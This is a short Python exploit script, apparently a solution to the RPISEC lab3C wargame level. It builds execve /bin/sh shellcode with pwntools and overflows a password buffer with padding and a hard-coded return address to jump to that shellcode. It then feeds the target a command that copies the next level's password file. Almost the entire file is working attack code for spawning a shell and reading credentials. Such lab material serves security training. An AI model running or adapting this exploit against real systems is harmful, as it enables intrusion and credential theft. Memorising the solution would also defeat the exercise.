import os
import pwn
import struct

instructions = [
    'xor eax,eax',
    'push  eax',
    'push 0x68732f2f',
    'push 0x6e69622f',
    'mov ebx,esp',
    'push eax',
    'push ebx',
    'mov ecx,esp',
    'mov al,0xb',
    'int 0x80'
    ]
shell = ''.join(map(pwn.asm, instructions))

userbuf = 'rpisec' +shell
retaddr = struct.pack('<I', 0x8049c46)
passbuf = 'admin' + 'A'*75+retaddr
cmd = 'python -c \'print "%s\\n%s"\'' %(userbuf,passbuf)
os.system('(%s; echo "cat /home/lab3B/.pass > /usr/slove/lab3B.pass") | ' %cmd +'/levels/lab03/lab3C')
print '[+] Password saved in /usr/slove/lab3B.pass'
